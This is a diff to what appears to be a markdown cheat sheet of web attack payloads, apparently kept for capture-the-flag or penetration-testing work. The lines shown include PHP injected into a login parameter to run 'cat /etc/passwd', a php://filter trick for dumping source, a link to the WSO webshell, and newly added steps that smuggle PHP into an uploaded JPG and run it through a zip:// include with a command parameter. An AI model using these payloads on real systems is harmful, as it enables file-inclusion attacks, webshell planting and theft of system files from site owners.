@@ -464,7 +464,12 @@ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
 php://filter/convert.base64-encode/resource=index.php
 ```
-#the end 
+>next upload jpg to shell
+```
+payalod.jpg><?php $dir='.'; $file = scandir($dir); print_r($file); ?>
+to page=zip://tmp/upload/1SZbCGZYs.jpg%23r&c=pwd
+```
+#the end
 
 
 
@@ -477,6 +482,8 @@ url=https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php
 >shortlink to shell
 ```
 shhortlink web scan
+payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
+
 ```
 
 
